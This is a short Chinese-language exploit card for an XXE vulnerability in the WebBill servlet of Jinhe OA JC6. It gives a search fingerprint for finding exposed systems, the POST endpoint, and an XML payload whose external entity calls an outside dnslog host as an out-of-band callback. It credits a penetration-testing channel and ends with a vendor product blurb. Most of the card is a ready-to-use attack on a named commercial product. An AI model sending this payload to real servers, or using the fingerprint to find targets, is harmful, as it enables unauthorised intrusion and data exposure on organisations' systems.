# 金和OAJC6WebBillxxe漏洞

- **系统**：金和OA　|　**类型**：XXE　|　**CVE**：—
- **指纹**：`web.body="JC6金和协同管理平台"`
- **请求**：`POST /jc6/servlet/WebBill?key=key HTTP/1.1`
- **关键头**：`Content-Length: 168`

**请求体 / payload**
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://u7euho.dnslog.cn">
%remote;
]>

\[金和OA-webbill-XXE.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 金和OA JC6 WebBill xxe漏洞: * 二、影响版本
* 三、资产测绘
* 四、漏洞简介
***
金和OA协同办公管理系统C6软件共有20多个应用模块，160多个应用子模块，涉及的企业管理业务包括协同办公管理、人力资源管理、项目管理、客户关系管理、企业目标管理、费用管理等多个业务范围，从功能型的协同办公平台上升到管理型协同管理平台，并不断的更新完善，全面支撑企业发展,提供专业oa,oa系统,oa办公系统,办公自动化软件,协同办公管理系统.支持oa办公自动化系统免费在线试用。金和OA JC6 WebBill xxe漏洞。
- 版本: * 金和OA